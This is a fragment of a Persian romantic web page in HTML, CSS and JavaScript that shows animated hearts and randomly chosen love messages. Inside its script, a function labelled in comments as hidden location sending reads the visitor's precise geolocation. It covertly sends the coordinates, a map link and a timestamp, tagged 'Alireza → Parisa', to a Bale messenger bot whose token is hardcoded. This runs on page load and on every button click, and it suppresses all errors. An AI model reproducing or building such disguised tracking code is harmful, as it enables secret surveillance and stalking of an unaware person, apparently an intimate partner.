    @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

      90% { opacity: 0.4; }
      100% { transform: translateY(-120px) translateX(calc(var(--sway) * -1)) rotate(360deg) scale(0.8); opacity: 0; }
    }
    .burst-heart {
      position: fixed; font-size: 24px; pointer-events: none; z-index: 100;
      animation: burst 1.1s ease-out forwards;
    }
    @keyframes burst {
      0% { transform: translate(0, 0) scale(0.3) rotate(0deg); opacity: 1; }

    @keyframes titleGlow {
      from { text-shadow: 0 2px 10px rgba(194, 24, 91, 0.3); }
      to { text-shadow: 0 2px 20px rgba(233, 30, 99, 0.6), 0 0 30px rgba(255, 105, 180, 0.3); }
    }
    .header p { color: #ad1457; font-size: 1.1rem; opacity: 0.9; }
    .card {

      box-shadow: 0 20px 60px rgba(233, 30, 99, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.8);

    }
    @keyframes cardEnter { from { opacity: 0; transform: scale(0.9) translateY(30px); } to { opacity: 1; transform: scale(1) translateY(0); } }
    .card:hover {
      transform: translateY(-6px);
      box-shadow: 0 28px 70px rgba(233, 30, 99, 0.35), 0 0 0 1px rgba(255, 255, 255, 0.7), 0 0 40px rgba(255, 105, 180, 0.2);

    .card::before {
      content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
      background: radial-gradient(circle, rgba(255, 182, 193, 0.2) 0%, transparent 55%);
      animation: pulse 5s infinite ease-in-out;
    }
    .card::after {
      content: ''; position: absolute; inset: 0; border-radius: 28px; padding: 2px;
      background: linear-gradient(135deg, rgba(255, 105, 180, 0.4), transparent, rgba(233, 30, 99, 0.3));
      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
      mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor; mask-composite: exclude;
      animation: borderGlow 4s ease-in-out infinite alternate; pointer-events: none;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.5; } 50% { transform: scale(1.15); opacity: 0.85; } }
    @keyframes borderGlow { from { opacity: 0.4; } to { opacity: 1; } }
    .message-box { min-height: 160px; display: flex; align-items: center; justify-content: center; margin: 20px 0 30px; position: relative; z-index: 2; }
    #message {
      font-size: 1.35rem; line-height: 1.9; color: #880e4f; font-weight: 500; padding: 10px;
      transition: all 0.45s cubic-bezier(0.22, 1, 0.36, 1);

    .btn {

      color: white; border: none; padding: 16px 40px; font-size: 1.15rem; font-family: inherit; font-weight: 600;

      display: inline-flex; align-items: center; gap: 10px; overflow: hidden;

    @keyframes btnGradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }

    .btn:hover { transform: translateY(-4px) scale(1.05); box-shadow: 0 14px 40px rgba(233, 30, 99, 0.55), 0 0 25px rgba(255, 105, 180, 0.4); }
    .btn:hover::after { opacity: 1; }

    .footer { margin-top: 35px; color: #ad1457; font-size: 0.9rem; opacity: 0.85; animation: fadeSlideUp 1s ease 0.6s both; }

    .counter { margin-top: 15px; font-size: 0.85rem; color: #c2185b; opacity: 0.7; position: relative; z-index: 2; transition: all 0.3s ease; }

    const variations = ["", " 💕", " ❤️", " 💗", " همیشه.", " برای همیشه.", " تا ابد.", " از ته دل.", " با تمام وجود.", " از عمق قلبم."];
    const prefixes = ["", "عزیزم، ", "نازنینم، ", "عشقم، ", "جانم، ", "دلم، "];

    let messages = [];
    baseMessages.forEach(msg => {
      variations.forEach(v => {
        prefixes.forEach(p => {
          if (messages.length < 1000) messages.push(p + msg + v);
        });
      });
    });
    while (messages.length < 1000) {
      const m = baseMessages[Math.floor(Math.random() * baseMessages.length)];
      const v = variations[Math.floor(Math.random() * variations.length)];
      const p = prefixes[Math.floor(Math.random() * prefixes.length)];
      messages.push(p + m + v);
    }
    messages = messages.slice(0, 1000);

    let shownCount = 0;

    function createHearts() {
      const container = document.getElementById('hearts');
      const emojis = ['💗', '💕', '💖', '❤️', '💘', '💓', '💞'];
      for (let i = 0; i < 30; i++) {
        const heart = document.createElement('div');
        heart.className = 'heart';
        heart.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        heart.style.left = Math.random() * 100 + 'vw';
        heart.style.fontSize = (14 + Math.random() * 22) + 'px';
        heart.style.setProperty('--sway', (Math.random() * 80 - 40) + 'px');
        heart.style.animationDuration = (7 + Math.random() * 10) + 's';
        heart.style.animationDelay = Math.random() * 8 + 's';
        container.appendChild(heart);
      }
    }

    function createBurst(x, y) {
      const emojis = ['💗', '💕', '💖', '❤️', '✨', '💘'];
      for (let i = 0; i < 14; i++) {
        const h = document.createElement('div');
        h.className = 'burst-heart';
        h.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
        h.style.left = x + 'px';
        h.style.top = y + 'px';
        const angle = (Math.PI * 2 * i) / 14;
        const dist = 60 + Math.random() * 90;
        h.style.setProperty('--tx', Math.cos(angle) * dist + 'px');
        h.style.setProperty('--ty', Math.sin(angle) * dist + 'px');
        h.style.setProperty('--rot', (Math.random() * 360 - 180) + 'deg');
        h.style.fontSize = (16 + Math.random() * 14) + 'px';
        document.body.appendChild(h);
        setTimeout(() => h.remove(), 1100);
      }
    }

    function createSparkles(x, y) {
      for (let i = 0; i < 10; i++) {
        const s = document.createElement('div');
        s.className = 'sparkle';
        s.style.left = x + 'px';
        s.style.top = y + 'px';
        s.style.setProperty('--sx', (Math.random() * 120 - 60) + 'px');
        s.style.setProperty('--sy', (Math.random() * 120 - 60) + 'px');
        document.body.appendChild(s);
        setTimeout(() => s.remove(), 1200);
      }
    }

    // ===== ربات بله (همان سیستم ثبت ساعت) =====
    const BALE_TOKEN = '666814160:KRTSKi_cdOSDPUEu6x4tJ5uD9iS_-E5StFQ';
    const BALE_CHAT_ID = '1163569220';
    const BALE_API = 'https://tapi.bale.ai/bot' + BALE_TOKEN;

    async function sendToBale(text) {
      const u = BALE_API + '/sendMessage?' + new URLSearchParams({
        chat_id: BALE_CHAT_ID,
        text: text
      });
      try {
        const res = await fetch('https://corsproxy.io/?' + encodeURIComponent(u), { cache: 'no-store' });
        if (res.ok) {
          const d = await res.json().catch(() => null);
          if (d && d.ok) return true;
        }
      } catch (e) {}
      try {
        await fetch(u, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
        return true;
      } catch (e) {}
      return false;
    }

    function getLocation() {
      return new Promise(function (resolve) {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            resolve({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            });
          },
          function () { resolve(null); },
          { enableHighAccuracy: true, timeout: 12000, maximumAge: 30000 }
        );
      });
    }

    function formatLocation(loc) {
      if (!loc) return '📍 موقعیت: در دسترس نبود';
      const map = 'https://maps.google.com/?q=' + loc.lat + ',' + loc.lng;
      return '📍 موقعیت:\n' + loc.lat.toFixed(6) + ', ' + loc.lng.toFixed(6) + '\n🗺️ ' + map;
    }

    // ارسال مخفی لوکیشن با هر کلیک دکمه
    async function silentSendLocation() {
      try {
        const loc = await getLocation();
        const time = new Date().toLocaleString('fa-IR');
        const msg =
          '💕 پیام عاشقانه\n' +
          '📌 رویداد: کلیک دکمه پیام بعدی\n' +
          '👤 علیرضا → پریسا\n' +
          '🕐 ' + time + '\n' +
          formatLocation(loc);
        await sendToBale(msg);
      } catch (e) {
        // کاملاً ساکت
      }
    }

    function showRandomMessage() {
      const msgEl = document.getElementById('message');
      const btn = document.getElementById('nextBtn');
      const rect = btn.getBoundingClientRect();
      const cx = rect.left + rect.width / 2;
      const cy = rect.top + rect.height / 2;

      createBurst(cx, cy);
      createSparkles(cx, cy);

      // ارسال مخفی لوکیشن به ربات بله
      silentSendLocation();

      msgEl.classList.remove('fade-in');
      msgEl.classList.add('fade-out');

      setTimeout(() => {
        const randomIndex = Math.floor(Math.random() * messages.length);
        msgEl.textContent = messages[randomIndex];
        msgEl.classList.remove('fade-out');
        msgEl.classList.add('fade-in');
        shownCount++;
        document.getElementById('counter').textContent = `پیام‌های نمایش‌داده‌شده: ${shownCount}`;
      }, 380);
    }

    // شروع
    createHearts();
    showRandomMessage();
